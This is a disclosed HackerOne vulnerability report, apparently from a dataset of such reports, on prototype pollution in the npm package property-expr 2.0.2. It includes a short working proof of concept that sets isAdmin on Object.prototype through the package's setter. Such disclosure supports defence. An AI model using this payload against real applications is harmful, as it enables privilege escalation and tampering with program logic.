---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '910206'
original_report_id: '910206'
title: property-expr - Prototype pollution
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-06-28T09:57:18.435Z'
disclosed_at: '2020-09-24T04:00:17.873Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 33
asset_identifier: property-expr
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# property-expr - Prototype pollution

## Metadata

- HackerOne Report ID: 910206
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-09-24T04:00:17.873Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Prototype pollution in property-expr
It allows attacker to modify the prototype of a base object.

# Module

**module name:** property-expr
**version:** 2.0.2
**npm page:** `https://www.npmjs.com/package/property-expr`

## Module Description

> Tiny property path utilities, including path parsing and metadata and deep property setters and getters

## Module Stats

> Replace stats below with numbers from npm’s module page:

[1,057,612] weekly downloads

# Vulnerability

## Vulnerability Description

> The functions setter can be tricked into modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Run the following code:
```
let expr = require('property-expr')
obj = {}
expr.setter('constructor.prototype.isAdmin')(obj,true)
console.log({}.isAdmin) // true
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N]  N
- I opened an issue in the related repository: [Y/N] N

## Impact

Modify Object prototype can lead to Dos, RCE, change code logic flow.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
